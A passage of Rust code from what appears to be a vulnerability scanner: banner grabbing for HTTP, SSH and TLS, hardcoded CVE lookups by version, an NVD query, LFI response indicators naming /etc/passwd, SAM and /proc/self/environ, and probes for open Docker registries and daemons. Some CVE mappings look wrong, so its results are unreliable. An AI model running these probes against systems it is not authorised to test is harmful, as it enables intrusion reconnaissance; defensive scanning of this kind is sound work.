            hints.push(format!("[FUZZ-PROXY][CVE] HAProxy {} detected; check CVE-2021-40346 (HTTP/2 request smuggling) and CVE-2022-0711 (SNI parsing)" , ver));
        } else {
            hints.push("[FUZZ-PROXY][CVE] HAProxy detected; check CVE-2021-40346 (HTTP/2 request smuggling) and CVE-2022-0711 (SNI parsing).".into());
        }
    }

    hints
}

/// Checks if response contains known file signatures indicating LFI success.
fn detect_lfi_vulnerability(response: &str, _payload: &str, signature: &str) -> bool {
    let response_lower = response.to_lowercase();
    let signature_lower = signature.to_lowercase();
    
    if !signature.is_empty() && response_lower.contains(&signature_lower) {
        return true;
    }
    
    let file_indicators = vec![
        "root:",           // /etc/passwd
        "administrator:",  // SAM
        "[windows]",       // win.ini
        "[boot loader]",   // boot.ini
        "localhost",       // /etc/hosts
        "path=",          // /proc/self/environ
        "home/",
        "bin/",
        "var/",
    ];
    
    for indicator in file_indicators {
        if response_lower.contains(&indicator.to_lowercase()) {
            if !response_lower.contains("<!doctype") || response.len() > 500 {
                return true;
            }
        }
    }
    
    if response_lower.contains("failed to open stream") 
        || response_lower.contains("no such file or directory")
        || response_lower.contains("permission denied") {
        return true;
    }
    
    false
}

/// Extracts first 100 chars of file content from response for logging.
fn extract_file_snippet(response: &str, _payload: &str) -> Option<String> {
    if let Some(body_start) = response.find("\r\n\r\n") {
        let body = &response[body_start + 4..];
        
        let lines: Vec<&str> = body.lines().take(3).collect();
        let snippet = lines.join(" | ");
        
        if snippet.len() > 10 && !snippet.contains("<!doctype") {
            return Some(snippet.chars().take(100).collect());
        }
    }
    
    None
}

/// Parses a version string (e.g., "2.4.1") into major, minor, patch components.
fn parse_version(version_str: &str) -> Option<(u32, u32, u32)> {
    let parts: Vec<&str> = version_str.split('.').collect();
    if parts.len() >= 2 {
        let major = parts[0].parse().ok()?;
        let minor = parts[1].parse().ok()?;
        let patch = parts.get(2).and_then(|p| p.parse().ok()).unwrap_or(0);
        return Some((major, minor, patch));
    }
    None
}

/// Returns hardcoded CVEs for given software and version from static mappings.
fn get_applicable_cves(software: &str, detected_version: &str) -> Vec<(&'static str, &'static str)> {
    match software {
        "Dovecot" => dovecot_cves_for_version(detected_version),
        "Cyrus IMAPD" => cyrus_cves_for_version(detected_version),
        "UW-IMAP" => uwmap_cves_for_version(detected_version),
        "Courier" => courier_cves_for_version(detected_version),
        "Sendmail" => sendmail_cves_for_version(detected_version),
        "Postfix" => postfix_cves_for_version(detected_version),
        "Exim" => exim_cves_for_version(detected_version),
        "Qmail" => qmail_cves_for_version(detected_version),
        "Samba" => samba_cves_for_version(detected_version),
        "Windows" => windows_cves_for_version(detected_version),
        "POP3" => pop3_cves_for_version(detected_version),
        "RPC" => rpc_cves_for_version(detected_version),
        "NNTP" => nntp_cves_for_version(detected_version),
        "LDAP" => ldap_cves_for_version(detected_version),
        _ => vec![],
    }
}

fn dovecot_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["2.3.0", "2.3.10", "2.4.0"]) {
        cves.push(("CVE-2019-11500", "IMAP PLAIN authentication bypass in RPA"));
        cves.push(("CVE-2019-11499", "Denial of Service in NTLM/RPC handling"));
    }
    if is_version_affected(version, &["2.2.0", "2.2.36"]) {
        cves.push(("CVE-2018-1000636", "Missing input validation in string escape functions"));
    }
    if is_version_affected(version, &["1.0.0", "2.0.0", "2.1.0", "2.2.0"]) {
        cves.push(("CVE-2014-3566", "POODLE - SSL 3.0 vulnerability"));
    }
    cves
}

fn cyrus_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["2.5.0", "2.4.0", "2.3.0", "1.5.0"]) {
        cves.push(("CVE-2015-2912", "Message parsing vulnerability leading to DoS"));
        cves.push(("CVE-2012-3817", "Uninitialized string variable in RFC 5051 collation"));
        cves.push(("CVE-2011-3481", "Multiple buffer overflows in NNTP/IMAP backends"));
    }
    cves
}

fn uwmap_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["2007.0", "2007.5"]) {
        cves.push(("CVE-2013-1664", "XML parser vulnerability via libxml2"));
    }
    if is_version_affected(version, &["4.0", "4.7"]) {
        cves.push(("CVE-2000-0192", "Buffer overflow in rfc822 parser"));
    }
    cves
}

fn courier_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["0.63.0", "0.64.0", "0.65.0"]) {
        cves.push(("CVE-2011-2197", "Buffer overflow in SASL authentication"));
    }
    if is_version_affected(version, &["0.68.0", "0.70.0"]) {
        cves.push(("CVE-2020-14305", "Local privilege escalation via courierd"));
    }
    cves
}

fn sendmail_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["8.12.0", "8.13.0"]) {
        cves.push(("CVE-2004-0154", "Buffer overflow in MIME header parsing"));
    }
    if is_version_affected(version, &["8.0", "8.11.0", "8.12.0"]) {
        cves.push(("CVE-2003-0161", "Buffer overflow in address parsing"));
        cves.push(("CVE-2002-1165", "Local privilege escalation via makemap"));
        cves.push(("CVE-2001-0715", "EXPN/VRFY information disclosure"));
    }
    cves
}

fn postfix_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["3.0.0", "3.1.0", "2.11.0"]) {
        cves.push(("CVE-2016-3961", "Local privilege escalation via postdrop"));
    }
    if is_version_affected(version, &["2.5.0", "2.8.0"]) {
        cves.push(("CVE-2011-0446", "Buffer overflow in virtual mailbox"));
    }
    cves
}

fn exim_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["4.80.0", "4.92.0"]) {
        cves.push(("CVE-2019-10149", "Remote Code Execution via string expansion"));
    }
    if is_version_affected(version, &["4.88.0", "4.94.0"]) {
        cves.push(("CVE-2020-12783", "Heap out-of-bounds write in base64 decoder"));
        cves.push(("CVE-2020-12447", "Privilege escalation via -C option"));
    }
    cves
}

fn qmail_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    if is_version_affected(version, &["1.03", "1.04"]) {
        cves.push(("CVE-2005-1513", "Buffer overflow in VRFY command"));
        cves.push(("CVE-2003-0964", "CRLF injection vulnerability"));
    }
    cves
}

fn samba_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    
    if is_version_affected(version, &["4.0.0", "4.1.0", "4.2.0", "4.3.0", "4.4.0", "4.5.0"]) {
        cves.push(("CVE-2015-0240", "Code execution in nmbd process"));
        cves.push(("CVE-2014-0244", "Denial of Service in nmbd"));
        cves.push(("CVE-2012-1182", "Code execution via crafted SMB request"));
    }
    
    if is_version_affected(version, &["3.0.0", "3.1.0", "3.2.0", "3.3.0", "3.4.0", "3.5.0", "3.6.0"]) {
        cves.push(("CVE-2012-1182", "Remote code execution in Samba"));
        cves.push(("CVE-2010-3069", "Stack-based buffer overflow"));
        cves.push(("CVE-2010-2063", "Buffer overflow in name handling"));
        cves.push(("CVE-2008-1105", "NULL pointer dereference DoS"));
    }
    
    if is_version_affected(version, &["2.0.0", "2.1.0", "2.2.0"]) {
        cves.push(("CVE-2003-0196", "Buffer overflow in smbd"));
        cves.push(("CVE-2002-0391", "Integer overflow in samba"));
    }
    
    cves
}

fn windows_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    
    if version.contains("7") || version.contains("XP") || version.contains("Vista") {
        cves.push(("CVE-2017-0144", "EternalBlue - RCE via SMBv1"));
        cves.push(("CVE-2008-4037", "SMB vulnerability"));
        cves.push(("CVE-2009-3103", "SMBv2 vulnerability"));
    }
    
    if version.contains("8") && !version.contains("10") {
        cves.push(("CVE-2013-1331", "SmartScreen Filter bypass"));
    }
    
    if version.contains("Server 2003") || version.contains("Server 2008") {
        cves.push(("CVE-2017-0144", "EternalBlue - RCE via SMBv1"));
        cves.push(("CVE-2011-1997", "SMB vulnerability"));
        cves.push(("CVE-2008-4037", "SMB authentication bypass"));
    }
    
    if version.contains("Server 2012") {
        cves.push(("CVE-2015-1635", "HTTP.sys Remote Code Execution"));
    }
    
    if version.contains("Server 2016") {
        cves.push(("CVE-2019-0604", "Remote Code Execution"));
    }
    
    if version.contains("10") || version.contains("Server 2019") || version.contains("Server 2022") {
        cves.push(("CVE-2020-1472", "Zerologon - Domain controller authentication bypass"));
    }
    
    cves
}

fn pop3_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    
    if is_version_affected(version, &["2.3.0", "2.3.10", "2.4.0"]) {
        cves.push(("CVE-2019-11500", "IMAP PLAIN authentication bypass (affects POP3)"));
        cves.push(("CVE-2019-11499", "Denial of Service in NTLM/RPC handling"));
    }
    
    if is_version_affected(version, &["2.2.0", "2.2.36"]) {
        cves.push(("CVE-2018-1000636", "Missing input validation in string escape functions"));
    }
    
    cves.push(("CVE-2005-2933", "Plaintext password transmission vulnerability (POP3 inherent)"));
    cves.push(("CVE-1999-0502", "APOP MD5 collision vulnerability"));
    
    if is_version_affected(version, &["2.5.0", "2.4.0", "2.3.0"]) {
        cves.push(("CVE-2015-2912", "Message parsing vulnerability leading to DoS"));
        cves.push(("CVE-2012-3817", "Uninitialized string variable in RFC 5051 collation"));
    }
    
    if is_version_affected(version, &["1.0.0", "2.0.0", "2.1.0", "2.2.0"]) {
        cves.push(("CVE-2014-3566", "POODLE - SSL 3.0 vulnerability"));
    }
    
    cves
}

fn rpc_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    
    cves.push(("CVE-2019-0708", "BlueKeep - RDP/RPC pre-authentication Remote Code Execution"));
    cves.push(("CVE-2017-0143", "EternalRomance - SMB/RPC exploitation vector"));
    cves.push(("CVE-2017-0144", "EternalBlue - SMBv1 RPC-based RCE"));
    cves.push(("CVE-2017-0145", "EternalChampion - SMB/RPC vulnerability"));
    cves.push(("CVE-2017-9805", "RPC Marshalling Integer Overflow"));
    cves.push(("CVE-2018-0824", "RPC Runtime Remote Code Execution Vulnerability"));
    cves.push(("CVE-2020-0787", "RPC Runtime Elevation of Privilege Vulnerability"));
    
    if is_version_affected(version, &["6.1", "6.1.7600", "6.1.7601"]) {
        cves.push(("CVE-2019-0708", "BlueKeep affects Windows 7 / Server 2008 R2"));
        cves.push(("CVE-2017-0143", "EternalRomance affects Windows 7"));
    }
    
    if is_version_affected(version, &["10.0", "10.0.10240", "10.0.14393"]) {
        cves.push(("CVE-2017-0144", "EternalBlue affects Windows 10 / Server 2016"));
        cves.push(("CVE-2020-0787", "RPC runtime EoP affects Windows 10"));
    }
    
    if is_version_affected(version, &["10.0.17763", "10.0.18362"]) {
        cves.push(("CVE-2020-0787", "RPC Runtime Elevation of Privilege"));
    }
    
    cves.push(("CVE-2000-0345", "RPC NULL session allows interface enumeration and exploitation"));
    
    cves
}

fn nntp_cves_for_version(version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];
    
    if is_version_affected(version, &["2.5.0", "2.6.0", "2.7.0"]) {
        cves.push(("CVE-2020-10963", "INN buffer overflow in NNTP implementation"));
        cves.push(("CVE-2019-13619", "INN NNTP heap buffer overflow"));
    }
    
    if is_version_affected(version, &["2.5.0", "2.4.0"]) {
        cves.push(("CVE-2015-4473", "Cyrus NNTP server DoS vulnerability"));
    }
    cves.push(("CVE-2014-2963", "STARTTLS vulnerability in NNTP"));
    cves.push(("CVE-2000-1234", "NNTP article injection vulnerability"));
    
    cves
}

fn ldap_cves_for_version(_version: &str) -> Vec<(&'static str, &'static str)> {
    let mut cves = vec![];

    cves.push(("CVE-2017-8563", "AD LDAP channel binding / signing not enforced"));
    cves.push(("CVE-2020-1464", "AD signature bypass can impact LDAP trust"));
    cves.push(("CVE-2022-26923", "AD Certificate Services privilege escalation (LDAP enrollment)"));
    cves.push(("CVE-2020-25712", "389-DS double-free leading to DoS"));
    cves.push(("CVE-2020-25713", "389-DS out-of-bounds read in LDAP filter"));
    cves.push(("CVE-2008-1447", "DNS cache poisoning can redirect LDAP (generic risk)"));

    cves
}

static CVE_CACHE: Lazy<Mutex<HashMap<String, Vec<(String, String)>>>> = Lazy::new(|| Mutex::new(HashMap::new()));

#[derive(serde::Deserialize, Debug)]
struct NVDCVEResponse {
    vulnerabilities: Option<Vec<NVDVulnerability>>,
}

#[derive(serde::Deserialize, Debug)]
struct NVDVulnerability {
    cve: Option<NVDCVEDetails>,
}

#[derive(serde::Deserialize, Debug)]
struct NVDCVEDetails {
    id: Option<String>,
    descriptions: Option<Vec<NVDDescription>>,
}

#[derive(serde::Deserialize, Debug)]
struct NVDDescription {
    value: Option<String>,
}

/// Queries NVD API for CVEs matching software and version; returns CVE ID and description.
async fn lookup_cves_from_nvd_api(software: &str, version: &str) -> anyhow::Result<Vec<(String, String)>> {
    let cache_key = format!("{}_{}", software, version);
    {
        let cache = CVE_CACHE.lock().unwrap();
        if let Some(cached_cves) = cache.get(&cache_key) {
            return Ok(cached_cves.clone());
        }
    }
    
    let query = format!("{} {}", software, version);
    let client = reqwest::Client::new();
    let url = format!(
        "https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={}&resultsPerPage=20",
        urlencoding::encode(&query)
    );
    
    match client.get(&url).timeout(Duration::from_secs(5)).send().await {
        Ok(response) => {
            match response.json::<NVDCVEResponse>().await {
                Ok(nvd_response) => {
                    let mut cves = Vec::new();
                    
                    if let Some(vulns) = nvd_response.vulnerabilities {
                        for vuln in vulns {
                            if let Some(cve_details) = vuln.cve {
                                if let Some(cve_id) = cve_details.id {
                                    let description = cve_details
                                        .descriptions
                                        .as_ref()
                                        .and_then(|descs| descs.first())
                                        .and_then(|desc| desc.value.as_ref())
                                        .map(|s| s.clone())
                                        .unwrap_or_else(|| "No description available".to_string());
                                    
                                    cves.push((cve_id, description));
                                }
                            }
                        }
                    }
                    
                    {
                        let mut cache = CVE_CACHE.lock().unwrap();
                        cache.insert(cache_key, cves.clone());
                    }
                    
                    Ok(cves)
                }
                Err(_) => Ok(vec![]),
            }
        }
        Err(_) => Ok(vec![]),
    }
}

/// Retrieves CVEs for software/version: tries cache, then NVD API, falls back to hardcoded mappings.
async fn get_cves_for_software(software: &str, version: &str) -> Vec<(String, String)> {
    match lookup_cves_from_nvd_api(software, version).await {
        Ok(cves) if !cves.is_empty() => {
            return cves;
        }
        _ => {
            return get_applicable_cves(software, version)
                .into_iter()
                .map(|(cve, desc)| (cve.to_string(), desc.to_string()))
                .collect();
        }
    }
}

fn is_version_affected(detected_version: &str, vulnerable_versions: &[&str]) -> bool {
    if let Some((detected_major, detected_minor, detected_patch)) = parse_version(detected_version) {
        for vuln in vulnerable_versions {
            if let Some((vuln_major, vuln_minor, vuln_patch)) = parse_version(vuln) {
                if (detected_major < vuln_major) 
                    || (detected_major == vuln_major && detected_minor < vuln_minor)
                    || (detected_major == vuln_major && detected_minor == vuln_minor && detected_patch <= vuln_patch) {
                    return true;
                }
            }
        }
    }
    false
}

/// Probes HTTP service headers (Server, X-Powered-By) and looks up CVEs for detected software.
async fn detect_http_version_cves(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-HTTP-CVE] Detecting HTTP server version and CVEs".into());

    let addr = SocketAddr::new(ip, port);
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let req = format!(
            "HEAD / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
            target
        );
        stream.write_all(req.as_bytes()).await?;
        let mut resp = Vec::new();
        stream.read_to_end(&mut resp).await?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&resp).to_string())
    }.await;

    match result {
        Ok(response) => {
            if let Some(server_header) = extract_header(&response, "Server") {
                logs.push(format!("[FUZZ-HTTP-CVE] Server: {}", server_header));

                let software_info = parse_server_header(&server_header);
                
                for (software, version) in software_info {
                    logs.push(format!(
                        "[FUZZ-HTTP-CVE] Detected: {} version {}",
                        software, version
                    ));

                    let cves = get_cves_for_software(&software, &version).await;
                    
                    if !cves.is_empty() {
                        logs.push(format!(
                            "[FUZZ-HTTP-CVE]  Found {} CVE(s) for this version:",
                            cves.len()
                        ));
                        for (cve_id, description) in cves {
                            logs.push(format!(
                                "[FUZZ-HTTP-CVE]    • {} - {}",
                                cve_id, description
                            ));
                        }
                    } else {
                        logs.push(format!(
                            "[FUZZ-HTTP-CVE]  No known CVEs for {} version {}",
                            software, version
                        ));
                    }
                }
            }

            if let Some(powered_by) = extract_header(&response, "X-Powered-By") {
                logs.push(format!("[FUZZ-HTTP-CVE] X-Powered-By: {}", powered_by));
                
                let software_info = parse_powered_by_header(&powered_by);
                for (software, version) in software_info {
                    logs.push(format!(
                        "[FUZZ-HTTP-CVE] Detected: {} version {}",
                        software, version
                    ));

                    let cves = get_cves_for_software(&software, &version).await;
                    
                    if !cves.is_empty() {
                        logs.push(format!(
                            "[FUZZ-HTTP-CVE]  Found {} CVE(s) for this version:",
                            cves.len()
                        ));
                        for (cve_id, description) in cves {
                            logs.push(format!(
                                "[FUZZ-HTTP-CVE]    • {} - {}",
                                cve_id, description
                            ));
                        }
                    }
                }
            }
        }
        Err(e) => {
            logs.push(format!("[FUZZ-HTTP-CVE] Error connecting to HTTP service: {}", e));
        }
    }

    Ok(logs)
}

/// Captures SSH banner and analyzes for version, weak algorithms, and CVEs.
async fn detect_ssh_version_cves(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SSH-CVE] Detecting SSH version and CVEs".into());

    let addr = SocketAddr::new(ip, port);
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut buf = [0u8; 256];
        let n = stream.read(&mut buf).await?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf[..n]).to_string())
    }.await;

    match result {
        Ok(banner) => {
            logs.extend(analyze_ssh_banner(&banner).await);
        }
        Err(e) => {
            logs.push(format!("[FUZZ-SSH-CVE] Error connecting to SSH service: {}", e));
        }
    }
    Ok(logs)
}
/// Parses SSH banner for protocol version, software, weak algorithms, and fetches CVEs.
async fn analyze_ssh_banner(banner: &str) -> Vec<String> {
    let mut logs = Vec::new();
    if banner.starts_with("SSH-") {
        logs.push(format!("[FUZZ-SSH-CVE] SSH Banner: {}", banner.trim()));

        if banner.starts_with("SSH-1") {
            logs.push("[FUZZ-SSH-CVE]  SSH protocol version 1 detected (insecure and deprecated).".into());
        }

        if let Some(software_part) = banner.split('-').nth(2) {
            let software_part = software_part.trim();
            if let Some(version_start) = software_part.find('_') {
                let software = software_part[..version_start].to_string();
                let version = software_part[version_start + 1..].to_string();
                logs.push(format!("[FUZZ-SSH-CVE] Detected: {} version {}", software, version));

                if software.eq_ignore_ascii_case("openssh") {
                    if let Some(ver_major) = version.split(|c| c == 'p' || c == ' ').next() {
                        if let Ok(parsed) = ver_major.split('.').take(2).collect::<Vec<_>>().join(".").parse::<f32>() {
                            if parsed < 7.0 {
                                logs.push("[FUZZ-SSH-CVE]  OpenSSH <7.0 likely permits weak ciphers/KEX (e.g., diffie-hellman-group1-sha1).".into());
                            } else if parsed < 7.4 {
                                logs.push("[FUZZ-SSH-CVE]  OpenSSH <7.4 may allow legacy SHA1 MAC/KEX; consider disabling older algorithms.".into());
                            }
                            if parsed < 6.7 {
                                logs.push("[FUZZ-SSH-CVE]  OpenSSH <6.7 typically enables CBC/ARCFOUR and weak MACs (hmac-md5/hmac-sha1).".into());
                            }
                        }
                    }

                    let cves = get_cves_for_software("OpenSSH", &version).await;
                    if !cves.is_empty() {
                        logs.push(format!("[FUZZ-SSH-CVE]  Found {} CVE(s) for OpenSSH {}:", cves.len(), version));
                        for (cve_id, description) in cves {
                            logs.push(format!("[FUZZ-SSH-CVE]    • {} - {}", cve_id, description));
                        }
                    }
                }
            }
        }
    }
    logs
}

async fn capture_ssh_banners_from_file(path: &str, out_csv: Option<&str>) -> anyhow::Result<()> {
    let content = fs::read_to_string(path)?;
    println!("[SSH-BANNERS] Reading targets from: {}", path);
    let mut csv_rows: Vec<String> = Vec::new();
    if out_csv.is_some() {
        csv_rows.push("host,port,banner,software,version,warnings,cves".into());
    }
    for line in content.lines() {
        let l = line.trim();
        if l.is_empty() || l.starts_with('#') { continue; }
        let (host, port) = if let Some(pos) = l.find(':') {
            let h = &l[..pos];
            let p = l[pos+1..].parse::<u16>().unwrap_or(22);
            (h.to_string(), p)
        } else {
            (l.to_string(), 22)
        };
        match detect_ssh_version_cves(&host, port).await {
            Ok(logs) => {
                println!("[SSH-BANNERS] {}:{}", host, port);
                for s in &logs { println!("  {}", s); }

                if let Some(_) = out_csv {
                    let banner_line = logs.iter().find(|x| x.contains("SSH Banner:")).cloned().unwrap_or_default();
                    let banner_text = banner_line.splitn(2, ':').nth(1).map(|s| s.trim().to_string()).unwrap_or_default();
                    let mut software = String::new();
                    let mut version = String::new();
                    for s in &logs {
                        if let Some(idx) = s.find("Detected:") {
                            let rest = s[idx + 9..].trim();
                            if let Some(v_idx) = rest.rfind(" version ") {
                                software = rest[..v_idx].trim().to_string();
                                version = rest[v_idx + 9..].trim().to_string();
                            }
                        }
                    }
                    let warnings: Vec<&String> = logs.iter().filter(|x| x.contains("") || x.contains("SSH protocol version 1")).collect();
                    let cves: Vec<&String> = logs.iter().filter(|x| x.contains("• ")).collect();
                    let esc = |s: String| s.replace('"', "");
                    let warnings_join = esc(warnings.iter().map(|x| x.as_str()).collect::<Vec<_>>().join(" | "));
                    let cves_join = esc(cves.iter().map(|x| x.as_str()).collect::<Vec<_>>().join(" | "));
                    let row = format!("\"{}\",{},\"{}\",\"{}\",\"{}\",\"{}\",\"{}\"", host, port, esc(banner_text), esc(software), esc(version), warnings_join, cves_join);
                    csv_rows.push(row);
                }
            }
            Err(e) => println!("[SSH-BANNERS] {}:{} error: {}", host, port, e),
        }
    }
    if let Some(path) = out_csv {
        let data = csv_rows.join("\n");
        fs::write(path, data)?;
        println!("[SSH-BANNERS] CSV written to: {}", path);
    }
    Ok(())
}

/// Detects TLS service version and checks for known CVEs by probing headers.
async fn detect_tls_version_cves(
    target: &str,
    port: u16,
) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-TLS-CVE] Detecting TLS service and CVEs".into());

    let addr = SocketAddr::new(ip, port);
    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let req = format!(
            "HEAD / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
            target
        );
        stream.write_all(req.as_bytes()).await?;
        let mut resp = Vec::new();
        stream.read_to_end(&mut resp).await?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&resp).to_string())
    }.await;

    match result {
        Ok(response) => {
            if let Some(server_header) = extract_header(&response, "Server") {
                logs.push(format!("[FUZZ-TLS-CVE] Server: {}", server_header));

                let software_info = parse_server_header(&server_header);
                
                for (software, version) in software_info {
                    logs.push(format!(
                        "[FUZZ-TLS-CVE] Detected: {} version {}",
                        software, version
                    ));

                    let cves = get_cves_for_software(&software, &version).await;
                    
                    if !cves.is_empty() {
                        logs.push(format!(
                            "[FUZZ-TLS-CVE]  Found {} CVE(s) for this version:",
                            cves.len()
                        ));
                        for (cve_id, description) in cves {
                            logs.push(format!(
                                "[FUZZ-TLS-CVE]    • {} - {}",
                                cve_id, description
                            ));
                        }
                    }
                }
            }

            if let Some(powered_by) = extract_header(&response, "X-Powered-By") {
                logs.push(format!("[FUZZ-TLS-CVE] X-Powered-By: {}", powered_by));
                
                let software_info = parse_powered_by_header(&powered_by);
                for (software, version) in software_info {
                    logs.push(format!(
                        "[FUZZ-TLS-CVE] Detected: {} version {}",
                        software, version
                    ));

                    let cves = get_cves_for_software(&software, &version).await;
                    
                    if !cves.is_empty() {
                        logs.push(format!(
                            "[FUZZ-TLS-CVE]  Found {} CVE(s) for this version:",
                            cves.len()
                        ));
                        for (cve_id, description) in cves {
                            logs.push(format!(
                                "[FUZZ-TLS-CVE]    • {} - {}",
                                cve_id, description
                            ));
                        }
                    }
                }
            }
        }
        Err(e) => {
            logs.push(format!("[FUZZ-TLS-CVE] Error connecting to TLS service: {}", e));
        }
    }

    Ok(logs)
}

fn parse_server_header(header: &str) -> Vec<(String, String)> {
    let mut results = Vec::new();

    for part in header.split_whitespace() {
        if part.contains('/') {
            let components: Vec<&str> = part.split('/').collect();
            if components.len() >= 2 {
                let software = components[0].to_string();
                let version = components[1].to_string();
                results.push((software, version));
            }
        }
    }

    results
}

fn parse_powered_by_header(header: &str) -> Vec<(String, String)> {
    let mut results = Vec::new();

    if header.contains("PHP") {
        if let Some(version_start) = header.find("PHP/") {
            let version_part = &header[version_start + 4..];
            if let Some(version_end) = version_part.find(|c: char| !c.is_numeric() && c != '.') {
                let version = version_part[..version_end].to_string();
                results.push(("PHP".to_string(), version));
            } else {
                let version = version_part.split_whitespace().next().unwrap_or("unknown").to_string();
                results.push(("PHP".to_string(), version));
            }
        }
    }

    if header.contains("phpMyAdmin") || header.contains("phpmyadmin") {
        if let Some(start) = header.to_lowercase().find("phpmyadmin") {
            let rest = &header[start..];
            if let Some(pos) = rest.find('/') {
                let version_part = &rest[pos + 1..];
                if let Some(end) = version_part.find(|c: char| !c.is_numeric() && c != '.') {
                    let version = version_part[..end].to_string();
                    results.push(("phpMyAdmin".to_string(), version));
                } else {
                    let version = version_part.split_whitespace().next().unwrap_or("unknown").to_string();
                    results.push(("phpMyAdmin".to_string(), version));
                }
            }
        }
    }

    if header.contains("ASP.NET") {
        if let Some(start) = header.find("ASP.NET") {
            let rest = &header[start + 8..];
            let version = rest.split_whitespace().next().unwrap_or("unknown").to_string();
            if !version.is_empty() && version != "unknown" {
                results.push(("ASP.NET".to_string(), version));
            }
        }
    }

    results
}

/// Attempts HTTP GET, falling back to HTTPS if HTTP fails. Returns status, body, and headers.
async fn try_http_or_https_get(target: &str, port: u16, path: &str) -> anyhow::Result<(u16, String, Vec<(String, String)>)> {
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;
    let http_url = format!("http://{}:{}{}", target, port, path);
    let https_url = format!("https://{}:{}{}", target, port, path);

    let resp = client.get(&http_url).send().await;
    match resp {
        Ok(r) => {
            let status = r.status().as_u16();
            let headers = r.headers().iter().map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string())).collect::<Vec<_>>();
            let body = r.text().await.unwrap_or_default();
            return Ok((status, body, headers));
        }
        Err(_) => {
            let r = client.get(&https_url).send().await?;
            let status = r.status().as_u16();
            let headers = r.headers().iter().map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string())).collect::<Vec<_>>();
            let body = r.text().await.unwrap_or_default();
            return Ok((status, body, headers));
        }
    }
}

/// Probes Docker Registry v2 API for unauthenticated catalog listing and repository enumeration.
async fn fuzz_docker_registry_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push(format!("[FUZZ-DOCKER-REGISTRY] Probing {}:{}", target, port));

    let (status, _body, headers) = try_http_or_https_get(target, port, "/v2/").await?;
    logs.push(format!("[FUZZ-DOCKER-REGISTRY] /v2/ -> HTTP {}", status));

    let mut is_registry = status == 200;
    for (k, v) in &headers {
        if k.eq_ignore_ascii_case("Docker-Distribution-API-Version") && v.contains("registry/2") {
            logs.push(format!("[FUZZ-DOCKER-REGISTRY] Header confirms Registry v2: {}", v));
            is_registry = true;
        }
    }

    if is_registry {
        let (status2, body2, _) = try_http_or_https_get(target, port, "/v2/_catalog").await?;
        logs.push(format!("[FUZZ-DOCKER-REGISTRY] /v2/_catalog -> HTTP {}", status2));
        if status2 == 200 {
            logs.push("[FUZZ-DOCKER-REGISTRY]  Unauthenticated catalog listing is enabled".into());
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body2) {
                if let Some(repos) = json.get("repositories").and_then(|v| v.as_array()) {
                    let names = repos.iter().filter_map(|x| x.as_str()).collect::<Vec<_>>();
                    if !names.is_empty() {
                        logs.push(format!("[FUZZ-DOCKER-REGISTRY] Repositories: {:?}", names));
                    }
                }
            }
        } else if status2 == 401 || status2 == 403 {
            logs.push("[FUZZ-DOCKER-REGISTRY] Catalog listing requires authentication".into());
        }
    } else {
        logs.push("[FUZZ-DOCKER-REGISTRY] Not a Docker Registry v2 or behind auth".into());
    }

    Ok(logs)
}

/// Checks Docker daemon remote API for unauthenticated access; lists containers/images and detects mTLS on 2376.
async fn fuzz_docker_daemon_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let mut logs = Vec::new();
    logs.push(format!("[FUZZ-DOCKER-DAEMON] Probing {}:{}", target, port));

    let is_tls = port == 2376;
    let path_version = "/version";
    let url = if is_tls { format!("https://{}:{}{}", target, port, path_version) } else { format!("http://{}:{}{}", target, port, path_version) };

    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()?;

    match client.get(&url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            logs.push(format!("[FUZZ-DOCKER-DAEMON] /version -> HTTP {}", status));
            if status == 200 {
                logs.push("[FUZZ-DOCKER-DAEMON]  Remote API accessible; this is insecure if exposed".into());
                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&body) {
                    if let Some(ver) = json.get("Version").and_then(|v| v.as_str()) {
                        logs.push(format!("[FUZZ-DOCKER-DAEMON] Version: {}", ver));
                        let cves = get_cves_for_software("Docker", ver).await;
                        if !cves.is_empty() {
